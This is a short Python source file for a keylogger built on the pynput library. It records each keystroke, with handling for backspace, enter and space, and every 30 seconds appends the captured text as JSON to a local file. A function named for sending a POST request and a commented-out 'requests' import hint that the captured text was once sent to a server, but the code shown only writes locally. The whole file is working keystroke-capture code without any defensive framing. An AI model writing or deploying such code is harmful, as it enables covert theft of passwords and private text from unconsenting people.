from pynput import keyboard
#import requests
import json
import threading

text = ""

time_interval = 30

def send_post_req():
    global text
    try:
        payload = json.dumps({"keyboardData" : text})
        with open("Keylogg.txt", "a", encoding="utf-8") as f:
            f.write(payload + "\n")
        
        text = ""
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except Exception as e:
        print(e)
        print("Couldn't complete request!")



def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


def startKeylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        send_post_req()
        listener.join()
